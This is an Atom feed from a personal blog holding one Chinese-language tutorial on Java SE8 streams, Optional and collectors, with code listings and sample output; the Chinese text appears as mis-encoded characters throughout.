<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Liebes çš„ä¸ªäººæ—¥å¿—</title>
  
  <subtitle>å¿ƒæ¯”å¤©é«˜ï¼Œå‘½æ¯”çº¸è–„ã€‚</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.liebes.top/"/>
  <updated>2019-08-04T12:56:30.278Z</updated>
  <id>https://blog.liebes.top/</id>
  
  <author>
    <name>Liebes</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java SE8 çš„æµåº“</title>
    <link href="https://blog.liebes.top/2018/05/03/learn-java-1/"/>
    <id>https://blog.liebes.top/2018/05/03/learn-java-1/</id>
    <published>2018-05-03T16:27:17.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>JAVAä¸­ï¼Œæµæ—¨åœ¨åˆ›å»ºä¸€ç§å…³æ³¨â€œåšä»€ä¹ˆè€Œéæ€ä¹ˆåšâ€çš„è®¾è®¡ç†å¿µï¼Œæˆ‘ä»¬æ— éœ€å…³å¿ƒæµå†…å…·ä½“çš„å®ç°ï¼Œè€ŒæŠŠæ›´å¤šç²¾åŠ›æ”¾åœ¨æµéœ€è¦åšä»€ä¹ˆä¸Šé¢ã€‚ä¾‹å¦‚æˆ‘ä»¬éœ€è¦è®¡ç®—ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ä¸­ï¼Œé•¿åº¦å¤§äº10çš„æœ‰å¤šå°‘ï¼Œå‚è§ä¸‹é¢çš„ä»£ç æ¸…å•ï¼š</p><pre><code class="java">public static void main(String args[]) throws IOException{    String contents = new String(Files.readAllBytes(Paths.get(&quot;/Users/liebes/Desktop/open.route&quot;)), StandardCharsets.UTF_8);    List&lt;String&gt; words = Arrays.asList(contents.split(&quot;\\PL+&quot;));    long count = 0;    // æ€ä¹ˆåš    for(String s : words){        if(s.length() &gt; 10) count++;    }    System.out.println(count);    // åšä»€ä¹ˆ    count = words.stream().filter(s -&gt; s.length() &gt; 10).count();    System.out.println(count);    count = words.parallelStream().filter(s -&gt; s.length() &gt; 10).count();    System.out.println(count);}</code></pre><p>ç¬¬ä¸€ç§æ–¹å¼ï¼Œæ˜¯å¾ˆå®¹æ˜“æƒ³åˆ°çš„ä¸€ç§ï¼Œå¾ªç¯éå†è®¡ç®—çš„ä¸€ç§æ–¹æ³•ï¼Œè€Œç¬¬äºŒç§åˆ™æ˜¯ä½¿ç”¨äº†æµçš„æ¦‚å¿µã€‚</p><p>Streamï¼Œæµã€‚æˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºæ°´æµï¼Œæ‰€æœ‰çš„æµæ“ä½œéƒ½æ˜¯æƒ°æ€§çš„ï¼Œå³å½“ä½ è®¿é—®æ•°æ®çš„æ—¶å€™ï¼Œç›¸å…³æ“ä½œæ‰ä¼šæ‰§è¡Œã€‚æˆ‘ä»¬åœ¨æ°´æµçš„è¡Œè¿›æ–¹å‘è®¾ç½®æˆ‘ä»¬æƒ³è¦å®Œæˆçš„æ“ä½œï¼Œå½“æ°´æµç»è¿‡æ—¶ï¼Œå°±ä¼šæ‰§è¡Œç›¸å…³çš„æ“ä½œã€‚ä¾‹å¦‚ä¸Šé¢çš„ <code>count = words.stream().filter(s -&gt; s.length() &gt; 10).count();</code> è¿™ä¸€å¥ï¼Œfilteræ–¹æ³•å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ°´é˜€ï¼Œæ§åˆ¶æ°´æµã€‚</p><h2 id="æµçš„åˆ›å»ºæ–¹å¼"><a href="#æµçš„åˆ›å»ºæ–¹å¼" class="headerlink" title="æµçš„åˆ›å»ºæ–¹å¼"></a>æµçš„åˆ›å»ºæ–¹å¼</h2><hr><p>æµçš„åˆ›å»ºæ–¹å¼æœ‰å¾ˆå¤šç§ï¼Œå¯ä»¥ä½¿ç”¨ Stream æä¾›çš„å·¥å‚æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨é›†åˆçš„è½¬æ¢æ–¹æ³•ã€‚</p><p>å½“ç„¶æµå¯ä»¥äº§ç”Ÿå­æµï¼Œä¸¤ä¸ªæµä¹Ÿå¯ä»¥åˆå¹¶æˆä¸€ä¸ªæµï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æŸäº›æ“ä½œï¼Œé€ä¸€å¤„ç†æµå†…çš„å…ƒç´ ï¼Œä¾‹å¦‚ <code>map flatMap filter</code> ç­‰æ–¹æ³•ã€‚</p><p>ä¸‹é¢æ˜¯åˆ›å»ºæµçš„ç¨‹åºæ¸…å•</p><pre><code class="Java">import java.io.IOException;import java.math.BigInteger;import java.nio.charset.StandardCharsets;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.List;import java.util.regex.Pattern;import java.util.stream.Collectors;import java.util.stream.Stream;public class Main {    // è¾“å‡ºæµ    public static &lt;T&gt; void show(String title, Stream&lt;T&gt; stream){        final int SIZE = 10;        List&lt;T&gt; firstElements = stream.limit(SIZE + 1).collect(Collectors.toList());        System.out.println(title + &quot;: &quot;);        for(int i = 0; i &lt; firstElements.size(); i ++){            if(i &gt; 0) System.out.print(&quot;, &quot;);            if(i &lt; SIZE)                System.out.print(firstElements.get(i));            else                System.out.println(&quot;...&quot;);        }        System.out.println();    }    public static void main(String args[]) throws IOException{        Path path = Paths.get(&quot;/Users/liebes/Desktop/open.route&quot;);        String contents = new String(Files.readAllBytes(path), StandardCharsets.UTF_8);        // é€šè¿‡ Stream.of ï¼Œä½¿ç”¨è‡ªè´Ÿè½¬æ•°ç»„è·å–æµ        Stream&lt;String&gt; words = Stream.of(contents.split(&quot;\\PL+&quot;));        show(&quot;words&quot;, words);        // é€šè¿‡ Stream.of ï¼Œä½¿ç”¨å¯å˜é•¿å‚æ•°        Stream&lt;String&gt; song = Stream.of(&quot;gently&quot;, &quot;down&quot;, &quot;the&quot;, &quot;stream&quot;);        show(&quot;song&quot;, song);        // ç©ºæµ        Stream&lt;String&gt; silence = Stream.empty();        show(&quot;silence&quot;, silence);        // ä½¿ç”¨ lemada        Stream&lt;String&gt; echos = Stream.generate(() -&gt; &quot;Echo&quot;);        show(&quot;echos&quot;, echos);        Stream&lt;Double&gt; randoms = Stream.generate(Math::random);        show(&quot;randoms&quot;, randoms);        Stream&lt;BigInteger&gt; integers = Stream.iterate(BigInteger.ONE, n-&gt;n.add(BigInteger.ONE));        show(&quot;integers&quot;, integers);        Stream&lt;String&gt; wordsAnotherWay = Pattern.compile(&quot;\\PL+&quot;).splitAsStream(contents);        show(&quot;wordsAnotherWay&quot;, wordsAnotherWay);        try(Stream&lt;String&gt; lines = Files.lines(path, StandardCharsets.UTF_8)){            show(&quot;lines&quot;, lines);        }    }}</code></pre><h2 id="ç»ˆç»“æ“ä½œ-amp-Optional-API-ä½¿ç”¨æ–¹å¼"><a href="#ç»ˆç»“æ“ä½œ-amp-Optional-API-ä½¿ç”¨æ–¹å¼" class="headerlink" title="ç»ˆç»“æ“ä½œ &amp; Optional API ä½¿ç”¨æ–¹å¼"></a>ç»ˆç»“æ“ä½œ &amp; Optional API ä½¿ç”¨æ–¹å¼</h2><hr><p>ç±»ä¼¼ <code>filter map</code> ç­‰æ–¹æ³•ï¼Œä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„å­æµï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªä¸­é—´å¤„ç†ï¼Œæµç»è¿‡è¿™äº›æ–¹æ³•ï¼Œæ•°æ®åšäº†å¤„ç†ï¼Œè¿”å›ä»ç„¶æ˜¯æµã€‚è¿™ç§æ–¹æ³•ä¸ºéç»ˆç»“æ–¹æ³•ã€‚</p><p>ç±»ä¼¼ <code>count</code> ç­‰æ–¹æ³•ï¼Œä¼šè¿”å›ä¸€ä¸ªå…·ä½“çš„ç»“æœï¼Œè¿™ç§æ“ä½œä¸ºéç»ˆç»“æ“ä½œã€‚</p><p>éç»ˆç»“æ“ä½œå¯èƒ½å¸¦æ¥çš„é—®é¢˜ï¼Œå°±æ˜¯æ²¡æœ‰æ»¡è¶³æ¡ä»¶çš„å…ƒç´ ï¼Œæ¯”å¦‚ <code>findFirst</code> æ–¹æ³•ï¼Œå¦‚æœæ²¡æœ‰æ»¡è¶³æ¡ä»¶çš„å…ƒç´ ï¼Œåˆ™å¯èƒ½å¯¼è‡´ç©ºæŒ‡é’ˆå¼‚å¸¸ã€‚</p><p>Optional ç±»æ˜¯ä¸€ç§åŒ…è£…ç±»ï¼Œä»–å­˜åœ¨çš„æ„ä¹‰åœ¨äºé¿å…ç©ºæŒ‡é’ˆå¼‚å¸¸çš„é—®é¢˜ï¼ˆå½“ç„¶è¿™éœ€è¦æ­£ç¡®çš„ä½¿ç”¨ï¼‰ã€‚</p><p>ç¨‹åºæ¸…å•å¦‚ä¸‹</p><pre><code class="java">import java.io.IOException;import java.nio.charset.StandardCharsets;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.*;public class Main {    // è¿”å›ä¸€ä¸ªåŒ…è£… 1/x çš„Optionalç±»    public static Optional&lt;Double&gt; inverse(Double x){        return x == 0 ? Optional.empty() : Optional.of(1 / x);    }    // è¿”å›ä¸€ä¸ªåŒ…è£… âˆšx çš„Optionalç±»    public static Optional&lt;Double&gt; squareRoot(Double x){        return x &lt; 0 ? Optional.empty() : Optional.of(Math.sqrt(x));    }    public static void main(String args[]) throws IOException{        Path path = Paths.get(&quot;/Users/liebes/Desktop/open.route&quot;);        String contents = new String(Files.readAllBytes(path), StandardCharsets.UTF_8);        List&lt;String&gt; wordList = Arrays.asList(contents.split(&quot;\\PL+&quot;));        Optional&lt;String&gt; optionalValue = wordList.stream()                .filter(s -&gt; s.contains(&quot;index&quot;))                .findFirst();        // orElse() æä¾›åŒ…è£…å€¼ä¸å­˜åœ¨çš„æ—¶å€™çš„é»˜è®¤å€¼        System.out.println(optionalValue.orElse(&quot;no word&quot;) + &quot; contains index&quot;);        Optional&lt;String&gt; optionalString = Optional.empty();        String result = optionalString.orElse(&quot;N/A&quot;);        System.out.println(&quot;result: &quot; + result);        result = optionalString.orElseGet(() -&gt; Locale.getDefault().getDisplayName());        System.out.println(result);        try{            result = optionalString.orElseThrow(IllegalStateException::new);            System.out.println(&quot;result: &quot; + result);        }catch (Throwable e){            e.printStackTrace();        }        optionalValue = wordList.stream()                .filter(s -&gt; s.contains(&quot;a&quot;))                .findFirst();        // ifPresent() å½“å­˜åœ¨çš„æ—¶å€™æ‰ä¼šæ‰§è¡Œé‡Œé¢çš„å‡½æ•°        optionalValue.ifPresent(s -&gt; System.out.println(s + &quot; contains a&quot;));        Set&lt;String&gt; results = new HashSet&lt;&gt;();        optionalValue.ifPresent(results::add);        Optional&lt;Boolean&gt; added = optionalValue.map(results::add);        System.out.println(added);        System.out.println(inverse(4.0).flatMap(Main::squareRoot));        System.out.println(inverse(-1.0).flatMap(Main::squareRoot));        System.out.println(inverse(0.0).flatMap(Main::squareRoot));        Optional&lt;Double&gt; result2 = Optional.of(-4.0)                .flatMap(Main::inverse).flatMap(Main::squareRoot);        System.out.println(result2);    }}// outputindex contains indexresult: N/AEnglish (United States)java.lang.IllegalStateException    at java.util.Optional.orElseThrow(Optional.java:290)    at Main.main(Main.java:34)app contains aOptional[false]Optional[0.5]Optional.emptyOptional.emptyOptional.empty</code></pre><h2 id="å–å‡ºå…ƒç´ "><a href="#å–å‡ºå…ƒç´ " class="headerlink" title="å–å‡ºå…ƒç´ "></a>å–å‡ºå…ƒç´ </h2><hr><p>å–å‡ºæµä¸­çš„å…ƒç´ æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯ä½¿ç”¨ <code>toArray</code> æ–¹æ³•ï¼Œè½¬æ¢æˆæ•°ç»„ï¼Œå¦ä¸€ç§æ˜¯ä½¿ç”¨ <code>iterator</code> éå†ã€‚</p><p>Stream æä¾›äº† collect æ–¹æ³•ï¼Œé€šè¿‡ä¼ å…¥çš„å·¥å‚æ–¹æ³•ï¼Œåˆå§‹åŒ–å…ƒç´ ã€‚Collectors ç±»ä¸­æä¾›äº†è®¸å¤šåˆ›å»ºå®¹å™¨çš„å·¥å‚æ–¹æ³•ã€‚</p><pre><code class="Java">import java.io.IOException;import java.nio.charset.StandardCharsets;import java.nio.file.Files;import java.nio.file.Paths;import java.util.*;import java.util.stream.Collectors;import java.util.stream.Stream;public class Main {    // å°†æ¯ä¸€ä¸ªå…ƒç´ ä¸­çš„ç‰¹å®šå­—ç¬¦è¿‡æ»¤æ‰ï¼Œè¿”å›æµ    public static Stream&lt;String&gt; noVowels() throws IOException{        String contents = new String(Files.readAllBytes(                Paths.get(&quot;/Users/liebes/Desktop/open.route&quot;)),                StandardCharsets.UTF_8        );        List&lt;String&gt; wordList = Arrays.asList(contents.split(&quot;\\PL+&quot;));        Stream&lt;String&gt; words = wordList.stream();        return words.map(s -&gt; s.replaceAll(&quot;[aeiouAEIOU]&quot;, &quot;&quot;));    }    // æ˜¾ç¤º    public static &lt;T&gt; void show(String label, Set&lt;T&gt; set){        System.out.print(label + &quot;: &quot; + set.getClass().getName());        System.out.println(&quot;[&quot; +                set.stream().limit(10).map(Object::toString)                        .collect(Collectors.joining(&quot;, &quot;)) + &quot;]&quot;);    }    public static void main(String args[]) throws IOException{        Iterator&lt;Integer&gt; iter = Stream.iterate(0, n -&gt; n + 1).limit(10).iterator();        while(iter.hasNext()){            System.out.println(iter.next());        }        // ç”±äºåœ¨è¿è¡Œæ—¶ä¸èƒ½æ³›åŒ–æ•°ç»„ï¼Œæ‰€ä»¥è¿”å›çš„ç±»å‹æ˜¯ Object[]        Object[] numbers = Stream.iterate(0, n -&gt; n + 1).limit(10).toArray();        System.out.println(&quot;Object array:&quot; + numbers);        try{            Integer number = (Integer) numbers[0];            System.out.println(&quot;number: &quot; + number);            System.out.println(&quot;The following statement throws an exception:&quot;);            Integer[] numbers2 = (Integer[]) numbers;        }        catch (ClassCastException e){            System.out.println(e);        }        // ç”Ÿæˆç‰¹å®šç±»å‹çš„æ•°ç»„        Integer[] numbers3 = Stream.iterate(0, n -&gt; n + 1).limit(10).toArray(Integer[]::new);        System.out.println(&quot;Integer array: &quot; + numbers3);        // ä½¿ç”¨ collect æ–¹æ³•        Set&lt;String&gt; noVowelSet = noVowels().collect(Collectors.toSet());        show(&quot;noVowelSet&quot;, noVowelSet);        TreeSet&lt;String&gt; noVowelTreeSet = noVowels().collect(                Collectors.toCollection(TreeSet::new)        );        show(&quot;noVowelTreeSet&quot;, noVowelTreeSet);        String result = noVowels().limit(10).collect(Collectors.joining());        System.out.println(&quot;joining: &quot; + result);        result = noVowels().limit(10).collect(Collectors.joining(&quot;, &quot;));        System.out.println(&quot;joining with commas: &quot; + result);        IntSummaryStatistics summary = noVowels().collect(Collectors.summarizingInt(String::length));        double averageWordLength = summary.getAverage();        double maxWordLength = summary.getMax();        System.out.println(&quot;Average word length: &quot; + averageWordLength);        System.out.println(&quot;Max word lengthL: &quot; + maxWordLength);        System.out.println(&quot;forEach: &quot;);        // forEach æ¥å—ä¸€ä¸ªé—­åŒ…ï¼Œç±»ä¼¼ map çš„ç”¨æ³•        noVowels().limit(10).forEach(System.out::println);    }}</code></pre><h2 id="æ”¶é›†ç»“æœåˆ°æ˜ å°„è¡¨"><a href="#æ”¶é›†ç»“æœåˆ°æ˜ å°„è¡¨" class="headerlink" title="æ”¶é›†ç»“æœåˆ°æ˜ å°„è¡¨"></a>æ”¶é›†ç»“æœåˆ°æ˜ å°„è¡¨</h2><hr><p>æœ‰æ—¶æˆ‘ä»¬éœ€è¦æŠŠæµä¸­çš„ç»“æœæ”¶é›†åˆ°æ˜ å°„è¡¨ä¸­ï¼Œä¾‹å¦‚è·å¾—ä¸€ä¸ª id -&gt; name çš„ä¸€ä¸ªæ˜ å°„è¡¨ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨ Collectors.toMap() è¿™ä¸ªæ–¹æ³•ã€‚</p><p>API æ–‡æ¡£å¦‚ä¸‹</p><blockquote><p>public static &lt;T,K,U,M extends Map&lt;K,U&gt;&gt; Collector&lt;T,?,M&gt; toMap(<br>    Function&lt;? super T,? extends K&gt; keyMapper,<br>    Function&lt;? super T,? extends U&gt; valueMapper,<br>    BinaryOperator<u> mergeFunction,<br>    Supplier<m> mapSupplier<br>)</m></u></p><p>Returns a <code>Collector</code> that accumulates elements into a <code>Map</code> whose keys and values are the result of applying the provided mapping functions to the input elements.</p><p>If the mapped keys contains duplicates (according to <a href="../../../java/lang/Object.html#equals-java.lang.Object-"><code>Object.equals(Object)</code></a>), the value mapping function is applied to each equal element, and the results are merged using the provided merging function. The <code>Map</code> is created by a provided supplier function.</p><ul><li><p>Type Parameters:</p><p><code>T</code> - the type of the input elements</p><p><code>K</code> - the output type of the key mapping function</p><p><code>U</code> - the output type of the value mapping function</p><p><code>M</code> - the type of the resulting <code>Map</code></p></li><li><p>Parameters:</p><p><code>keyMapper</code> - a mapping function to produce keys</p><p><code>valueMapper</code> - a mapping function to produce values</p><p><code>mergeFunction</code> - a merge function, used to resolve collisions between values associated with the same key, as supplied to <a href="../../../java/util/Map.html#merge-K-V-java.util.function.BiFunction-"><code>Map.merge(Object, Object, BiFunction)</code></a></p><p><code>mapSupplier</code> - a function which returns a new, empty <code>Map</code> into which the results will be inserted</p></li><li><p>Returns:</p><p>a <code>Collector</code> which collects elements into a <code>Map</code> whose keys are the result of applying a key mapping function to the input elements, and whose values are the result of applying a value mapping function to all input elements equal to the key and combining them using the merge function</p></li></ul></blockquote><p>å…¶ä¸­åä¸¤ä¸ªå‚æ•°å¯ä»¥ç¼ºçœã€‚</p><p>å‰ä¸¤ä¸ªå‚æ•°å®šä¹‰äº† è·å– <code>Key</code> ä¸ <code>Value</code> çš„å‡½æ•°ï¼Œå½“å‘ç”Ÿå†²çªçš„æ—¶å€™ï¼Œåˆ™è°ƒç”¨ç¬¬ä¸‰ä¸ªå‚æ•°è¿›è¡Œmergeï¼Œå¦‚æœä¸å®šä¹‰ï¼Œåˆ™ç‚¹é‚£ä¸ª Key å†²çªåˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p><p>ç¬¬å››ä¸ªå‚æ•°å®šä¹‰äº†è¿”å› <code>Map</code> çš„å…·ä½“ç±»å‹ï¼Œå¯ä»¥ä¼ å…¥ä»»ä½•ä¸€ä¸ª <code>Map</code> å­ç±»çš„ <code>Supplier</code>ï¼Œä¾‹å¦‚ <code>TreeMap::new</code>ã€‚</p><pre><code class="java">import java.io.IOException;import java.util.*;import java.util.function.Function;import java.util.stream.Collectors;import java.util.stream.Stream;public class Main {    public static class Person{        private int id;        private String name;        public Person(int id, String name){            this.id = id;            this.name = name;        }        public int getId(){            return id;        }        public String getName(){            return name;        }        public String toString(){            return getClass().getName() + &quot;[id=&quot; + id + &quot;, name=&quot; + name;        }    }    public static Stream&lt;Person&gt; people(){        return Stream.of(new Person(1001, &quot;peter&quot;), new Person(1002, &quot;paul&quot;), new Person(1003, &quot;Mary&quot;));    }    public static void main(String args[]) throws IOException {        // ç¼ºçœåä¸¤ä¸ªå‚æ•°        Map&lt;Integer, String&gt; idToName = people().collect(                Collectors.toMap(Person::getId, Person::getName)        );        System.out.println(&quot;idToName: &quot; + idToName);        // ID -&gt; Person        Map&lt;Integer, Person&gt; idToPerson = people().collect(                Collectors.toMap(Person::getId, Function.identity())        );        System.out.println(&quot;idToPerson: &quot; + idToPerson.getClass().getName() + idToPerson);        // å½“å†²çªçš„æ—¶å€™è§£å†³åŠæ³•        idToPerson = people().collect(                Collectors.toMap(Person::getId, Function.identity(),                        (existingValue, newValue) -&gt; { throw new IllegalStateException(); },                        TreeMap::new)        );        System.out.println(&quot;idToPerson: &quot; + idToPerson.getClass().getName() + idToPerson);        Stream&lt;Locale&gt; locales = Stream.of(Locale.getAvailableLocales());        Map&lt;String, String&gt; languageNames = locales.collect(                Collectors.toMap(                        Locale::getDisplayName,                        Locale::getDisplayLanguage,                        (existingValue, newValue) -&gt; existingValue                )        );        System.out.println(&quot;languageNames: &quot; + languageNames);        locales = Stream.of(Locale.getAvailableLocales());        // ç»“æœå†²çªä¿ç•™æ‰€æœ‰ Value        Map&lt;String, Set&lt;String&gt;&gt; countryLanguageSets = locales.collect(                Collectors.toMap(                        Locale::getDisplayCountry,                        l -&gt; Collections.singleton(l.getDisplayLanguage()),                        (a, b) -&gt; {                            Set&lt;String&gt; union = new HashSet&lt;&gt;(a);                            union.addAll(b);                            return union;                        }                )        );        System.out.println(&quot;countryLanguageSets: &quot; + countryLanguageSets);    }}// outputidToName: {1001=peter, 1002=paul, 1003=Mary}idToPerson: java.util.HashMap{1001=Main$Person[id=1001, name=peter, 1002=Main$Person[id=1002, name=paul, 1003=Main$Person[id=1003, name=Mary}idToPerson: java.util.TreeMap{1001=Main$Person[id=1001, name=peter, 1002=Main$Person[id=1002, name=paul, 1003=Main$Person[id=1003, name=Mary}languageNames: {Japanese (Japan,JP)=Japanese, Ukrainian (Ukraine)=Ukrainian, =, ...countryLanguageSets: {=[, Italian, Slovak, Russian, Hebrew, Belarusian, Serbian, ...</code></pre><p>ï¼ˆæœ‰ä¸€äº›å…³äºSupplier Functionè¿™äº›æ¥å£çš„ä½¿ç”¨ï¼Œç™¾åº¦ä¸€ä¸‹å°±æ‡‚äº†ï¼‰</p><h2 id="èšåˆæ“ä½œ"><a href="#èšåˆæ“ä½œ" class="headerlink" title="èšåˆæ“ä½œ"></a>èšåˆæ“ä½œ</h2><hr><p>æœ‰æ—¶æˆ‘ä»¬éœ€è¦åƒæ•°æ®åº“æ“ä½œé‚£æ ·è¿›è¡Œæ•°æ®ç»Ÿè®¡ï¼Œéœ€è¦ç”¨åˆ°ä¸€äº›èšåˆæ“ä½œã€‚ä¾‹å¦‚ç»Ÿè®¡æ¯ä¸ªçœä»½çš„äººæ•°æ€»å’Œã€‚</p><p>è¿™é‡Œéœ€è¦è¯¦ç»†æŸ¥çœ‹ä¸€ä¸‹ <code>collect</code> æ–¹æ³•çš„API</p><blockquote><p><strong>collect</strong></p><p><code>&lt;R,A&gt; R collect(Collector&lt;? super T,A,R&gt; collector)</code></p><p>Performs a <a href>mutable reduction</a> operation on the elements of this stream using a <code>Collector</code>. A <code>Collector</code> encapsulates the functions used as arguments to <a href><code>collect(Supplier, BiConsumer, BiConsumer)</code></a>, allowing for reuse of collection strategies and composition of collect operations such as multiple-level grouping or partitioning.</p><p>If the stream is parallel, and the <code>Collector</code> is <a href><code>concurrent</code></a>, and either the stream is unordered or the collector is <a href><code>unordered</code></a>, then a concurrent reduction will be performed (see <a href><code>Collector</code></a> for details on concurrent reduction.)</p><p>This is a <a href>terminal operation</a>.</p><p>When executed in parallel, multiple intermediate results may be instantiated, populated, and merged so as to maintain isolation of mutable data structures. Therefore, even when executed in parallel with non-thread-safe data structures (such as <code>ArrayList</code>), no additional synchronization is needed for a parallel reduction.</p><p><strong>Type Parameters:</strong></p><p><code>R</code> - the type of the result</p><p><code>A</code> - the intermediate accumulation type of the <code>Collector</code></p><p><strong>Parameters:</strong></p><p><code>collector</code> - the <code>Collector</code> describing the reduction</p><p><strong>Returns:</strong></p><p>the result of the reduction</p></blockquote><p>collect æ–¹æ³•æ¥å—ä¸€ä¸ªæ”¶é›†å™¨ï¼Œè¿”å›å€¼ç”±å…·ä½“æ”¶é›†å™¨æ¥å†³å®šã€‚ä¼ å…¥æ”¶é›†å™¨çš„å‚æ•°ä¸ºæµä¸­å…ƒç´  Tï¼ŒRä¸ºæ”¶é›†å™¨è¿”å›çš„ç±»å‹ã€‚</p><p>èšé›†æ“ä½œä¸»è¦ä½¿ç”¨ groupingBy æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ¥å—ä¸€ä¸ª Function æ¥å£ç±»å‹çš„å‚æ•°ï¼Œä»¥åŠä¸€ä¸ªä¸‹æ¸¸æ”¶é›†å™¨ã€‚ä¸‹æ¸¸æ”¶é›†å™¨è´Ÿè´£å¤„ç†èšé›†åå­å…ƒç´ çš„æ“ä½œã€‚</p><p>è¿™é‡Œéœ€è¦æ˜ç¡®æµçš„æµå‘ï¼Œå‚è€ƒä¸‹é¢çš„ä»£ç </p><p>èšé›†æ“ä½œ -&gt; æ¯ä¸ªkeyå¯¹åº”çš„å­æµç”±mappingæ”¶é›†å™¨æ”¶é›†</p><p>-&gt; å°†å…ƒç´ ç±»å‹ä¸º City çš„æµæ˜ å°„æˆ String -&gt; å­æµç”± maxBy æ”¶é›†å™¨æ”¶é›†</p><pre><code class="java">Map&lt;String, Optional&lt;String&gt;&gt; stateToLongestCityName = cities.collect(        groupingBy(                City::getState,                mapping(City::getName, maxBy(Comparator.comparing(String::length)))        ));</code></pre><p>ä¸‹é¢æ˜¯å…·ä½“çš„ç¨‹åºæ¸…å•</p><pre><code class="java">import java.io.IOException;import java.nio.file.Files;import java.nio.file.Paths;import java.util.*;import java.util.stream.Collectors;import java.util.stream.Stream;import static java.util.stream.Collectors.*;public class Main {    public static class City{        private String name;        private String state;        private int population;        public City(String name, String state, int population) {            this.name = name;            this.state = state;            this.population = population;        }        public String getName() {            return name;        }        public String getState() {            return state;        }        public int getPopulation() {            return population;        }    }    public static Stream&lt;City&gt; readCities(String filename) throws IOException{        return Files.lines(Paths.get(filename)).map(l -&gt; l.split(&quot;, &quot;))                .map(a -&gt; new City(a[0], a[1], Integer.parseInt(a[2])));    }    public static void main(String args[]) throws IOException{        Stream&lt;Locale&gt; locales = Stream.of(Locale.getAvailableLocales());        // ä½¿ç”¨ toSet æ”¶é›†å™¨ï¼Œå°†ç»“æœè½¬æ¢æˆSET        locales = Stream.of(Locale.getAvailableLocales());        Map&lt;String, Set&lt;Locale&gt;&gt; countryToLocaleSet = locales.collect(                Collectors.groupingBy(Locale::getCountry, toSet())        );        System.out.println(&quot;countryToLocaleSet: &quot; + countryToLocaleSet);        // ä½¿ç”¨ counting æ”¶é›†å™¨ï¼Œè®²ç»“æœè½¬æ¢æˆè®¡æ•°        locales = Stream.of(Locale.getAvailableLocales());        Map&lt;String, Long&gt; countryToLocalesCount = locales.collect(                Collectors.groupingBy(Locale::getCountry, counting())        );        System.out.println(&quot;countryToLocalesCount: &quot; + countryToLocalesCount);        // ç´¯åŠ å’Œ        Stream&lt;City&gt; cities = readCities(&quot;/Users/liebes/cities.txt&quot;);        Map&lt;String, Integer&gt; stateToCityPopulation = cities.collect(                Collectors.groupingBy(City::getState, summingInt(City::getPopulation))        );        System.out.println(&quot;stateToCItyPopulation: &quot; + stateToCityPopulation);        // æ±‚å‡ºæœ€å€¼        cities = readCities(&quot;/Users/liebes/cities.txt&quot;);        Map&lt;String, Optional&lt;String&gt;&gt; stateToLongestCityName = cities.collect(                groupingBy(                        City::getState,                        mapping(City::getName, maxBy(Comparator.comparing(String::length)))                )        );        System.out.println(&quot;stateToLongestCityName: &quot; + stateToLongestCityName);        locales = Stream.of(Locale.getAvailableLocales());        Map&lt;String, Set&lt;String&gt;&gt; countryToLanguages = locales.collect(                groupingBy(                        Locale::getDisplayCountry,                        mapping(Locale::getDisplayLanguage, toSet())                )        );        System.out.println(&quot;countryToLanguages: &quot; + countryToLanguages);        cities = readCities(&quot;/Users/liebes/cities.txt&quot;);        Map&lt;String, IntSummaryStatistics&gt; stateToCityPopulationSummary = cities.collect(                groupingBy(                        City::getState, summarizingInt(City::getPopulation)                )        );        System.out.println(stateToCityPopulationSummary.get(&quot;liaoning&quot;));        // reducing æ“ä½œï¼Œç¬¬ä¸€ä¸ªå‚æ•°åº”è¯¥æ˜¯é»˜è®¤çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¸”å½“æµä¸ºç©ºæ—¶ä½œä¸ºè¿”å›å€¼        cities = readCities(&quot;/Users/liebes/cities.txt&quot;);        Map&lt;String, String&gt; stateToCityNames = cities.collect(                groupingBy(                        City::getState,                        reducing(&quot;&quot;, City::getName, (s, t) -&gt; s.length() == 0 ? t : s + &quot;, &quot; + t)                )        );        System.out.println(&quot;stateToCityName1: &quot; + stateToCityNames);        cities = readCities(&quot;/Users/liebes/cities.txt&quot;);        stateToCityNames = cities.collect(                groupingBy(                        City::getState,                        mapping(City::getName, joining(&quot;, &quot;))                )        );        System.out.println(&quot;stateToCityName2: &quot; + stateToCityNames);     }}// outputcountryToLocaleSet: {=[, in, sl, ...], DE=[de_DE], PR=[es_PR], HK=[zh_HK], TW=[zh_TW], PT=[pt_PT], HN=[es_HN], DK=[da_DK], LT=[lt_LT], LU=[de_LU, fr_LU], ...}countryToLocalesCount: {=46, DE=1, PR=1, HK=1, TW=1, HR=1, DO=1, UA=1, YE=1, LY=1, HU=1, QA=1, MA=1, DZ=1, ME=2, ID=1, ...}stateToCItyPopulation: {jilin=56, tianjin=20, beijing=200, liaoning=259, heilongjiang=70}stateToLongestCityName: {jilin=Optional[jilin], tianjin=Optional[tianjin], beijing=Optional[beijing], liaoning=Optional[shenyang], heilongjiang=Optional[haerbin]}countryToLanguages: {=[, Italian, Slovak, Russian, Hebrew, Belarusian, Serbian, German, Slovenian, Swedish, Turkish, Ukrainian, ...], Cyprus=[Greek], Sudan=[Arabic], Malaysia=[Malay], Paraguay=[Spanish], Portugal=[Portuguese], Oman=[Arabic], ...}IntSummaryStatistics{count=3, sum=259, min=10, average=86.333333, max=149}stateToCityName1: {jilin=jilin, tianjin=tianjin, beijing=beijing, liaoning=shenyang, yingkou, dalian, heilongjiang=haerbin, mohe}stateToCityName2: {jilin=jilin, tianjin=tianjin, beijing=beijing, liaoning=shenyang, yingkou, dalian, heilongjiang=haerbin, mohe}// 